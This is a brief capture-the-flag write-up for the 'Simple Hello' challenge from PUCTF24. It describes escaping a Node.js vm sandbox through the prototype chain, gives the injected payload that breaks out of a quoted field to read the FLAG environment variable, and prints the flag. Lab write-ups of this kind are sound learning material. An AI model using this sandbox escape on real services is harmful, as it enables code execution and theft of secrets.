## Simple Hello

found node vm in source code<br>
=> google `ctf node vm`<br>
=> found Node.js sandbox escape<br>
=> use prototype chain `this.constructor.constructor` to get function constructor<br>
=> send payload `"; nickname = this.constructor.constructor('return this.process.env.FLAG')(); "`

PUCTF24{n0d3js_vm_1s_n07_s3cur3_cdd9e68f1bfb49641e59a798abec1181}
